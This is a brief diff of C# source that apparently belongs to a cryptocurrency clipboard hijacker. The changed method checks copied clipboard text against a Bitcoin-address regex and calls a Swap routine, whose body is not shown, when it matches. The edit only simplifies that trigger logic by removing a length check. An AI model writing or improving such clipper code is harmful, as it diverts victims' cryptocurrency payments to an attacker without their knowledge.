@@ -98,11 +98,8 @@ namespace CCH
         {
             string copied = Clipboard.GetText().Trim();
 
-            if (copied.Length > 0)
-            {
-                if (btcaddr.IsMatch(copied))
-                    Swap();
-            }
+            if (btcaddr.IsMatch(copied))
+               Swap();            
         }
 
         private void btnStop_Click(object sender, EventArgs e)
